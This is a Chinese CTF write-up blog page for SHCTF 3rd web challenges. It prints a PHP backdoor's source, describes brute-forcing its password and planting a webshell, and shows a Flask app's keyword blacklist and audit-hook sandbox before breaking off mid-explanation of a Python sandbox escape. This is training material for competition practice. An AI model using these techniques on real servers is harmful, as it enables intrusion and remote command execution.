@@ -1,0 +1,1216 @@
+<!doctype html>
+<html class="position-relative" itemscope itemtype="https://schema.org/WebPage" lang="en"
+  data-bs-theme="auto" data-palette="blue">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><script src="/assets/init/bundle.min.e2303ecedf4a0b4053349a6f6f175a0abb5da5373ba37c14cd589b22ff2b2288.js" integrity="sha256-4jA&#43;zt9KC0BTNJpvbxdaCrtdpTc7o3wUzVibIv8rIog=" crossorigin="anonymous"></script>
+<meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>SHCTF-web2026-WP - xiaochai_123的小窝</title>
+    <link rel="icon" href="http://localhost:1313/images/icons/icon-16x16.png?version=10de02cdc53ad46a103b64b869070266" sizes="16x16">
+    <link rel="icon" href="http://localhost:1313/images/icons/icon-32x32.png?version=f1747f8c31b6821777c3a0956b5ba0db" sizes="32x32">
+    <link rel="icon" href="/favicon_hu_1fce3f16494f6ae3.png" sizes="150x150" type="image/png">
+    <link rel="apple-touch-icon" href="/favicon_hu_f105fae78c239d0f.png" sizes="180x180" type="image/png">
+    <link rel="icon" href="/favicon_hu_af357fe99fc0195a.png" sizes="192x192" type="image/png">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#6f42c1"><link rel="icon" href="http://localhost:1313/images/icons/favicon.ico?version=13a0b7f517ed6605fd5fc54b37b8552d">
+<meta name="keywords" content="" />
+  <meta name="description" content="SHCTF3rd复现wp" />
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/images/shctf3rd.jpg">
+  <meta name="twitter:title" content="SHCTF-web2026-WP">
+  <meta name="twitter:description" content="SHCTF3rd复现wp">
+<meta property="og:url" content="http://localhost:1313/posts/shctf-web2026-wp/">
+  <meta property="og:site_name" content="xiaochai_123的小窝">
+  <meta property="og:title" content="SHCTF-web2026-WP">
+  <meta property="og:description" content="SHCTF3rd复现wp">
+  <meta property="og:locale" content="zh_cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-02-22T18:35:35+08:00">
+    <meta property="article:modified_time" content="2026-02-22T18:35:35+08:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="Web">
+    <meta property="og:image" content="http://localhost:1313/images/shctf3rd.jpg">
+
+  <meta itemprop="name" content="SHCTF-web2026-WP">
+  <meta itemprop="description" content="SHCTF3rd复现wp">
+  <meta itemprop="datePublished" content="2026-02-22T18:35:35+08:00">
+  <meta itemprop="dateModified" content="2026-02-22T18:35:35+08:00">
+  <meta itemprop="wordCount" content="1061">
+  <meta itemprop="image" content="http://localhost:1313/images/shctf3rd.jpg">
+  <meta itemprop="keywords" content="CTF,Web">
+  <meta property="og:image:alt" content="SHCTF-web2026-WP" />
+  <meta name="twitter:image:alt" content="SHCTF-web2026-WP" />
+
+<link data-precache rel="stylesheet" href="/assets/main/bundle.min.d5aac6480a1ef020e43c97debab51daf2d7322416eaa854051c3e1c6ef2b77df.css" integrity="sha256-1arGSAoe8CDkPJfeurUdry1zIkFuqoVAUcPhxu8rd98=" crossorigin="anonymous">
+
+    <link data-precache rel="stylesheet" href="/assets/viewer/bundle.min.5778ec8e95e9d1e612441ebcf911ccb843e5cc5d9a1fc99ec90a32adbfebb3b4.css" integrity="sha256-V3jsjpXp0eYSRB68&#43;RHMuEPlzF2aH8meyQoyrb/rs7Q=" crossorigin="anonymous">
+
+
+
+<link rel="stylesheet" href="/css/custom.css">
+<script>
+(function() {
+  var originalTitle = document.title;
+  document.addEventListener('visibilitychange', function() {
+    if (document.hidden) {
+      document.title = '下次再见~';
+    } else {
+      document.title = '欢迎回来~';
+      setTimeout(function() {
+        document.title = originalTitle;
+      }, 1500); 
+    }
+  });
+})();
+</script><link rel="stylesheet" href="/css/all.min.css">
+  </head>
+  <body><header class="mb-4 sticky-top">
+  
+<nav class="top-app-bar shadow navbar navbar-expand-lg">
+  <div class="container">
+<a class="navbar-brand d-flex align-items-center flex-grow-1 flex-xxl-grow-0 justify-content-xxl-start ms-2 ms-xxl-0 mx-auto me-xxl-2"
+    href="http://localhost:1313/">
+    <picture><img class="logo " alt="Logo" src="http://localhost:1313/images/logo.png?v=166cbf8ee66ab6626f3f85db1fb49313" loading="lazy" width="2048" height="2048" />
+</picture>
+xiaochai_123的小窝
+</a>
+
+    <div class="offcanvas-lg offcanvas-end flex-grow-1" data-bs-scroll="true" tabindex="-1" id="navbarMenus" aria-labelledby="navbarMenusLabel">
+      <div class="offcanvas-header px-4 pb-0">
+        <div class="offcanvas-title h5" id="navbarMenusLabel">xiaochai_123的小窝</div>
+        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="offcanvas" data-bs-target="#navbarMenus" aria-label="Close"></button>
+      </div>
+      <div class="offcanvas-body p-4 pt-0 p-lg-0">
+        <hr class="d-lg-none">
+        <ul class="navbar-nav flex-row flex-wrap align-items-center me-auto"><li class="nav-item col-6 col-lg-auto">
+            <a class="nav-link py-2 px-0 px-lg-2" href="http://localhost:1313/posts/">Posts
+            </a>
+          </li><li class="nav-item col-6 col-lg-auto">
+            <a class="nav-link py-2 px-0 px-lg-2" href="http://localhost:1313/categories/">Categories
+            </a>
+          </li><li class="nav-item col-6 col-lg-auto">
+            <a class="nav-link py-2 px-0 px-lg-2" href="http://localhost:1313/tags/">Tags
+            </a>
+          </li><li class="nav-item col-6 col-lg-auto">
+            <a class="nav-link py-2 px-0 px-lg-2" href="http://localhost:1313/friends/">Friends
+            </a>
+          </li>
+        </ul>
+        
+    <hr class="d-lg-none">
+    <form class="search-bar ms-auto my-auto" action="" novalidate>
+      <div class="input-group align-items-center">
+        <span class="btn btn-search disabled position-absolute left-0 border-0 px-1">
+          <i class="fas fa-fw fa-search fa-lg"></i>
+        </span>
+        <input
+          class="my-1 form-control border-white rounded-5 search-input bg-body"
+          name="q"
+          type="search"
+          placeholder="Search"
+          aria-label="Search"
+          required>
+          <span class="search-shortcut position-absolute end-0 top-0 me-2">
+            <kbd class="text-dark bg-white opacity-75 rounded-3 shadow border border-primary py-1 fw-bold">/</kbd>
+          </span>
+      </div>
+    </form><hr class="d-lg-none">
+        <ul class="navbar-nav flex-row flex-wrap align-items-center ms-md-auto">
+<li class="nav-item dropdown col-6 col-lg-auto">
+    <a class="nav-link px-0 py-2 px-lg-1" href="#" id="paletteDropdown" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+        <i class="fas fa-fw fa-palette"></i>
+        <span class="d-lg-none">Palette</span>
+    </a>
+    <ul class="palette-dropdown-menu dropdown-menu dropdown-menu-end px-2 row g-2" aria-labelledby="paletteDropdown">
+            <li class="col-4 my-1">
+                <a role="button" id="palette-blue" aria-label="Blue"
+                    class="btn btn-sm w-100 palette text-bg-blue" data-palette="blue">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-blue-gray" aria-label="Blue Gray"
+                    class="btn btn-sm w-100 palette text-bg-blue-gray" data-palette="blue-gray">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-brown" aria-label="Brown"
+                    class="btn btn-sm w-100 palette text-bg-brown" data-palette="brown">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-cyan" aria-label="Cyan"
+                    class="btn btn-sm w-100 palette text-bg-cyan" data-palette="cyan">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-green" aria-label="Green"
+                    class="btn btn-sm w-100 palette text-bg-green" data-palette="green">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-indigo" aria-label="Indigo"
+                    class="btn btn-sm w-100 palette text-bg-indigo" data-palette="indigo">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-orange" aria-label="Orange"
+                    class="btn btn-sm w-100 palette text-bg-orange" data-palette="orange">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-pink" aria-label="Pink"
+                    class="btn btn-sm w-100 palette text-bg-pink" data-palette="pink">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-purple" aria-label="Purple"
+                    class="btn btn-sm w-100 palette text-bg-purple" data-palette="purple">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-red" aria-label="Red"
+                    class="btn btn-sm w-100 palette text-bg-red" data-palette="red">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-teal" aria-label="Teal"
+                    class="btn btn-sm w-100 palette text-bg-teal" data-palette="teal">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-yellow" aria-label="Yellow"
+                    class="btn btn-sm w-100 palette text-bg-yellow" data-palette="yellow">
+                </a>
+            </li>
+    </ul>
+</li>
+<li class="nav-item dropdown col-6 col-lg-auto">
+    <a class="nav-link px-0 py-2 px-lg-1" href="#" id="modeDropdown" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+        <i class="mode-icon fas fa-fw fa-adjust" id="modeIcon"></i>
+        <span class="d-lg-none">Mode</span>
+    </a>
+    <ul class="mode-dropdown-menu dropdown-menu dropdown-menu-end" aria-labelledby="modeDropdown">
+        <li class="mode-item" data-color-mode="light" data-icon="sun">
+            <button class="dropdown-item">
+                <i class="mode-icon fas fa-fw fa-sun"></i> Light
+            </button>
+        </li>
+        <li class="mode-item" data-color-mode="dark" data-icon="moon">
+            <button class="dropdown-item">
+                <i class="mode-icon fas fa-fw fa-moon"></i> Dark
+            </button>
+        </li>
+        <li class="mode-item active" data-color-mode="auto" data-icon="adjust">
+            <button class="dropdown-item">
+                <i class="mode-icon fas fa-fw fa-adjust"></i> Auto
+            </button>
+        </li>
+    </ul>
+</li>
+        </ul>
+      </div>
+    </div>
+    <div class="d-flex">
+      <button class="navbar-toggler order-5 border-0" type="button" data-bs-toggle="offcanvas" data-bs-target="#navbarMenus"
+        aria-controls="navbarMenus" aria-expanded="false" aria-label="Toggle navigation">
+        <i class="fas fa-ellipsis-h"></i>
+      </button>
+    </div>
+  </div>
+</nav>
+
+</header>
+
+    <main class="container has-sidebar" data-kind="page"><script data-precache src="/js/main-init.a9427f53469a98d1f41056ab9e1e085a005990992fc0f97bbf459f35ed9d1d43.js" integrity="sha256-qUJ/U0aamNH0EFarnh4IWgBZkJkvwPl7v0WfNe2dHUM=" crossorigin="anonymous"></script>
+
+      <div class="row content"><noscript>
+    <div class="alert alert-danger" role="alert">Your browser does not support JavaScript.</div>
+</noscript>
+
+<div class="content-posts col-xxl-8">
+  <div class="container"><nav class="row card component" aria-label="breadcrumb">
+  <div class="card-body pb-0">
+    <ol class="hbs-breadcrumb breadcrumb flex-nowrap"><li class="breadcrumb-item text-surface"><a href="/">Home</a></li><li class="breadcrumb-item text-surface"><a href="/posts/">Posts</a></li><li class="breadcrumb-item active">SHCTF-web2026-WP</li></ol>
+  </div>
+</nav><div class="post-panel-wrapper position-relative d-flex justify-content-center">
+  <div class="d-flex flex-row justify-content-center rounded-5 border post-panel position-fixed px-3 py-1 surface shadow-1">
+    
+    
+
+    
+    
+    
+  <a class="action action-toc d-none d-xxl-block" href="#postTOC" role="button" title="Contents">
+    <i class="fas fa-fw fa-list-alt"></i>
+  </a>
+<a class="action action-toc d-block d-xxl-none" href="#post-toc-container" role="button" title="Contents">
+  <i class="fas fa-fw fa-list-alt"></i>
+</a>
+
+    <a class="action action-post-comments" href="#post-comments" role="button" aria-label="Comments" title="Comments">
+  <i class="fas fa-fw fa-comments"></i>
+</a>
+    
+<a id="sidebarToggler" class="action action-sidebar-toggler d-none d-xl-block" role="button" title="Toggle sidebar">
+  <i class="fas fa-fw fa-expand-alt" data-fa-transform="rotate-45"></i>
+</a>
+
+    
+  </div>
+</div><article class="row card component mb-4 post">
+  <div class="card-header ">
+    <h1 class="card-title post-title my-2">SHCTF-web2026-WP</h1>
+  </div>
+  <div class="card-body"><div class="post-meta mb-3">
+  <span class="post-date me-1 mb-1" title="created on 2026-02-22 18:35:35 &#43;0800 CST.">February 22, 2026</span><span class="post-reading-time me-1 mb-1">5 min read</span><a href="/categories/ctfwp/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-category">
+      <i class="fas fa-fw fa-folder me-1"></i>CTFwp</a><a href="/tags/ctf/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-tag">CTF</a><a href="/tags/web/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-tag">Web</a>
+</div>
+
+      <p class="lead mb-3 text-body-emphasis">SHCTF3rd复现wp</p>
+<div class="mt-2 mb-3 d-block d-xxl-none">
+    <h2 class="text-surface mb-3">Contents</h2>
+    <div id="post-toc-container">
+        </div>
+    <hr class="text-secondary">
+</div><div class="post-content mb-3" data-bs-spy="scroll" data-bs-target="#TableOfContents" tabindex="0">
+        <div id="post-content-body">
+<h1 id="shctf-3rd-web-wp" data-numberify>SHCTF-3rd-Web-WP<a class="anchor ms-1" href="#shctf-3rd-web-wp"></a></h1>
+
+<h2 id="challenge-info---" data-numberify>Challenge Info - [<a class="anchor ms-1" href="#challenge-info---"></a></h2>
+<p><picture><img class="img-fluid " alt="chrome_mVYWnZo06K" src="" loading="lazy" />
+</picture>
+
+没钱起手，想买flag还缺47，看看源代码，发现提示</p>
+<p><picture><img class="img-fluid " alt="" src="" loading="lazy" />
+</picture>
+
+</p>
+<p>使用cyberchef解码拿到信息</p>
+<p><picture><img class="img-fluid " alt="msedge_NypgJhfoDY" src="" loading="lazy" />
+</picture>
+
+</p>
+<p>说是有个shell.php，爆破一下看看有什么路径，（不小心把靶机扫爆了）根据提示我们来到这里</p>
+<p><picture><img class="img-fluid " alt="chrome_nuhdKeK7nL" src="" loading="lazy" />
+</picture>
+
+</p>
+<p>发现php代码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;show&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$pass <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;c4d038b4bed09fdb1471ef51ec3a32cd&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;key&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">md5</span>($_POST[<span style="color:#e6db74">&#39;key&#39;</span>]) <span style="color:#f92672">===</span> $pass) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;cmd&#39;</span>])) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>($_POST[<span style="color:#e6db74">&#39;cmd&#39;</span>]);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">elseif</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;code&#39;</span>])) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">eval</span>($_POST[<span style="color:#e6db74">&#39;code&#39;</span>]);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">http_response_code</span>(<span style="color:#ae81ff">404</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>找出passwd，其md5是c4d038b4bed09fdb1471ef51ec3a32cd</p>
+<p>只要passwd对了就拿到shell</p>
+<p>用神秘小脚本爆破一下简单的字符集，看到源码是114514</p>
+<p><picture><img class="img-fluid " alt="image-20260221234208383" src="" loading="lazy" />
+</picture>
+
+</p>
+<p>进去之后没发现有什么flag，写个小马进去（这里我最开始把马写在tmp目录下，蚁剑无法连接，Web服务被限制了，所以我们要写在/var/www/html里面</p>
+<p><picture><img class="img-fluid " alt="java_3IQvfhXsHz" src="" loading="lazy" />
+</picture>
+
+</p>
+<p><picture><img class="img-fluid " alt="AntSword_KqvtdhyAuf" src="" loading="lazy" />
+</picture>
+
+</p>
+<p>ok,成功连接，看到它的钱数，我们给他改多就好了</p>
+<p><picture><img class="img-fluid " alt="AntSword_ZSRbr7jujF" src="" loading="lazy" />
+</picture>
+
+</p>
+<p><picture><img class="img-fluid " alt="image-20260222000829979" src="" loading="lazy" />
+</picture>
+
+</p>
+
+<h2 id="challenge-info----1" data-numberify>Challenge Info - [<a class="anchor ms-1" href="#challenge-info----1"></a></h2>
+<p>上来就是牢大Hacker out<picture><img class="img-fluid " alt="image-20260222000950704" src="" loading="lazy" />
+</picture>
+
+</p>
+<p>点一下关于，发现上面有file=xxx，可能有路径穿越</p>
+<p><picture><img class="img-fluid " alt="image-20260222001746512" src="" loading="lazy" />
+</picture>
+
+</p>
+<p>读到源码</p>
+<p><picture><img class="img-fluid " alt="image-20260222001827307" src="" loading="lazy" />
+</picture>
+
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, render_template_string, request, jsonify
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> tempfile
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+</span></span><span style="display:flex;"><span>    file_name <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;file&#39;</span>, <span style="color:#e6db74">&#39;pages/index.html&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(file_name, <span style="color:#e6db74">&#39;r&#39;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;utf-8&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>            content <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;pages/index.html&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;utf-8&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>            content <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template_string(content)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">waf</span>(code):
+</span></span><span style="display:flex;"><span>    blacklisted_keywords <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;import&#39;</span>, <span style="color:#e6db74">&#39;open&#39;</span>, <span style="color:#e6db74">&#39;read&#39;</span>, <span style="color:#e6db74">&#39;write&#39;</span>, <span style="color:#e6db74">&#39;exec&#39;</span>, <span style="color:#e6db74">&#39;eval&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;__&#39;</span>, <span style="color:#e6db74">&#39;os&#39;</span>, <span style="color:#e6db74">&#39;sys&#39;</span>, <span style="color:#e6db74">&#39;subprocess&#39;</span>, <span style="color:#e6db74">&#39;run&#39;</span>, <span style="color:#e6db74">&#39;flag&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> keyword <span style="color:#f92672">in</span> blacklisted_keywords:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> keyword <span style="color:#f92672">in</span> code:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/execute&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">execute_code</span>():
+</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>json<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;code&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> code:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#39;error&#39;</span>: <span style="color:#e6db74">&#39;请输入Python代码&#39;</span>})
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> waf(code):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#39;error&#39;</span>: <span style="color:#e6db74">&#39;Hacker!&#39;</span>})
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> tempfile<span style="color:#f92672">.</span>NamedTemporaryFile(mode<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;w&#39;</span>, suffix<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;.py&#39;</span>, delete<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>            f<span style="color:#f92672">.</span>write(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#34;&#34;import sys
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">sys.modules[&#39;os&#39;] = &#39;not allowed&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">def is_my_love_event(event_name):
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    return event_name.startswith(&#34;Nothing is my love but you.&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">def my_audit_hook(event_name, arg):
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    if len(event_name) &gt; 0:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        raise RuntimeError(&#34;Too long event name!&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    if len(arg) &gt; 0:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        raise RuntimeError(&#34;Too long arg!&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    if not is_my_love_event(event_name):
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        raise RuntimeError(&#34;Hacker out!&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">__import__(&#39;sys&#39;).addaudithook(my_audit_hook)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#e6db74">{</span>code<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>            temp_file_name <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>name
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>run(
+</span></span><span style="display:flex;"><span>            [sys<span style="color:#f92672">.</span>executable, temp_file_name],
+</span></span><span style="display:flex;"><span>            capture_output<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>,
+</span></span><span style="display:flex;"><span>            text<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>,
+</span></span><span style="display:flex;"><span>            timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        os<span style="color:#f92672">.</span>unlink(temp_file_name)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify({
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;stdout&#39;</span>: result<span style="color:#f92672">.</span>stdout,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;stderr&#39;</span>: result<span style="color:#f92672">.</span>stderr
+</span></span><span style="display:flex;"><span>        })
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> subprocess<span style="color:#f92672">.</span>TimeoutExpired:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#39;error&#39;</span>: <span style="color:#e6db74">&#39;代码执行超时（超过10秒）&#39;</span>})
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#39;error&#39;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;执行出错: </span><span style="color:#e6db74">{</span>str(e)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>})
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">finally</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(temp_file_name):
+</span></span><span style="display:flex;"><span>            os<span style="color:#f92672">.</span>unlink(temp_file_name)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(debug<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span></code></pre></div><p>题目核心是 <code>/execute</code> 接口，它的逻辑如下：</p>
+<ul>
+<li>接收 POST JSON <code>{&quot;code&quot;: &quot;你的python代码&quot;}</code></li>
+<li><strong>WAF 过滤</strong>：代码中不能出现 <code>import</code>, <code>open</code>, <code>read</code>, <code>write</code>, <code>exec</code>, <code>eval</code>, <code>__</code>, <code>os</code>, <code>sys</code>, <code>subprocess</code>, <code>run</code>, <code>flag</code>, <code>'</code>, <code>&quot;</code></li>
+<li>如果通过 WAF，代码会被写入临时文件，并在<strong>审计钩子</strong>环境下执行：
+<ul>
+<li><code>sys.modules['os'] = 'not allowed'</code> → 无法直接 <code>import os</code></li>
+<li>注册了 <code>my_audit_hook</code>，任何 Python 操作都会触发</li>
+<li>触发条件极其严格：事件名长度必须为 0、参数长度必须为 0、事件名必须以 <code>&quot;Nothing is my love but you.&quot;</code> 开头</li>
+</ul>
+</li>
+</ul>
+<p>审计钩子虽然严格，但它使用了内置函数 <code>len()</code> 和 自定义函数 <code>is_my_love_event</code></p>
+<p>如果我们能在审计钩子触发之前，覆写这两个函数，让它们返回符合要求的值，就能绕过</p>
+<p>因为它的防御代码在我们代码之前，我们要修改 <code>len</code> 或者 <code>is_my_love_event</code> 的定义，下一次钩子再调用的时候用的就是我们的定义</p>
+<p>len是内置函数，存在<code>__builtins__</code>这个字典里。</p>
+<p>我们要先拿到<code>__builtins__</code></p>
+<p>Python 里，每个函数都有一个 <code>__globals__</code> 属性，它是一个<strong>字典</strong>，里面存着这个函数能访问的所有全局变量</p>
+<pre tabindex="0"><code>如何拿到一个对象？
+
+从某个已知对象出发，比如空列表 []
+获取它的类 [].__class__ → list
+获取 list 的基类 [].__class__.__bases__[0] → object
+获取 object 的所有子类 object.__subclasses__()
